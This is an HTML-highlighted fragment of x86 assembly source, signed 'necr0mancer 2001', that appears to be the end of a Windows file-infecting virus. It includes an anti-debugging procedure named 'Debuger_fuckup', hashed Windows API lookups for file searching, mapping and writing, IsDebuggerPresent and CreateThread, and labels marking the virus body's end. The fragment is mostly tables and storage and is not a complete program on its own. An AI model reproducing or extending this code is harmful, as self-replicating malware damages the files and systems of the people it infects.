                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
                </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">PM_out</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;=============================================================================</span><span class="sc0">

</span><span class="sc5">Debuger_fuckup</span><span class="sc0">          </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">c_manager</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">call_mng.inc</span><span class="sc0">
</span><span class="sc5">cm_size</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">c_manager</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">RIPbin.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">ring3io.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">npe32bin.inc</span><span class="sc0">


</span><span class="sc5">_Table</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">_CreateFileA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">              </span><span class="sc2">0830F55B4h</span><span class="sc0">
</span><span class="sc5">_CreateFileMapping</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">              </span><span class="sc2">06817C213h</span><span class="sc0">
</span><span class="sc5">_MapViewOfFile</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">              </span><span class="sc2">0CF4C00A1h</span><span class="sc0">
</span><span class="sc5">_UnmapViewOfFile</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">              </span><span class="sc2">0C027BC23h</span><span class="sc0">

</span><span class="sc5">_CloseHandle</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">              </span><span class="sc2">07CD0735Bh</span><span class="sc0">

</span><span class="sc5">_ReadFile</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">              </span><span class="sc2">02804FB4Dh</span><span class="sc0">
</span><span class="sc5">_FindFirstFileA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">              </span><span class="sc2">0A32BE888h</span><span class="sc0">
</span><span class="sc5">_FindNextFileA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">              </span><span class="sc2">0233AEB5Eh</span><span class="sc0">
</span><span class="sc5">_FindClose</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">              </span><span class="sc2">0E6CCF387h</span><span class="sc0">
</span><span class="sc5">_GlobalAlloc</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">              </span><span class="sc2">06CCA7EE0h</span><span class="sc0">
</span><span class="sc5">_GlobalFree</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">              </span><span class="sc2">04753EBE5h</span><span class="sc0">
</span><span class="sc5">_SetFilePointer</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">              </span><span class="sc2">0E747C386h</span><span class="sc0">
</span><span class="sc5">_WriteFile</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">              </span><span class="sc2">018D5ABDFh</span><span class="sc0">
</span><span class="sc5">_GetCurrentDirectoryA</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0">              </span><span class="sc2">0B089B6BEh</span><span class="sc0">
</span><span class="sc5">_IsDebuggerPresent</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">              </span><span class="sc2">015B27F29h</span><span class="sc0">
</span><span class="sc5">_ExitThread</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">              </span><span class="sc2">01E799321h</span><span class="sc0">
</span><span class="sc5">_CreateThread</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">              </span><span class="sc2">072F17A7Bh</span><span class="sc0">

</span><span class="sc5">its_over</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">              </span><span class="sc2">0FFFFFFFFh</span><span class="sc0">
</span><span class="sc5">_fbodyend</span><span class="sc4">:</span><span class="sc0">




</span><span class="sc5">_adr</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">CreateFile</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;2</span><span class="sc0">

</span><span class="sc5">CreateFileMappingA</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">MapViewOfFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">UnmapViewOfFile</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">CloseHandle</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;3</span><span class="sc0">
</span><span class="sc5">ReadFile</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;4</span><span class="sc0">
</span><span class="sc5">FindFirstFile</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;6</span><span class="sc0">
</span><span class="sc5">FindNextFile</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;7</span><span class="sc0">
</span><span class="sc5">FindClose</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;8</span><span class="sc0">
</span><span class="sc5">GlobalAlloc</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;9</span><span class="sc0">
</span><span class="sc5">GlobalFree</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;a</span><span class="sc0">
</span><span class="sc5">SetFilePointer</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;b</span><span class="sc0">
</span><span class="sc5">WriteFile</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">           </span><span class="sc1">;c</span><span class="sc0">
</span><span class="sc5">GetCurrentDirectory</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">     </span><span class="sc1">;d</span><span class="sc0">
</span><span class="sc5">IsDebuggerPresent</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ExitThread</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">CreateThread</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">;-------------------------------------</span><span class="sc0">

</span><span class="sc5">curdir</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">SearchRec</span><span class="sc0">       </span><span class="sc5">f_struc</span><span class="sc4">&lt;,,,,,,,&gt;</span><span class="sc0">

</span><span class="sc5">DirNum</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FileNum</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">bytesread</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc5">first_run_npe</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">runSeed</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dirname</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">jmp_tmp_table</span><span class="sc4">:</span><span class="sc0">
               </span><span class="sc9">dq</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">_endvbody</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">_emulation</span><span class="sc0">

</span><span class="sc1">;==============================================================================</span><span class="sc0">
</span><span class="sc1">;                            (C) necr0mancer 2001</span><span class="sc0">
</span><span class="sc1">;                                         necr0mancer2001@hotmail.com</span></div></body>
</html>
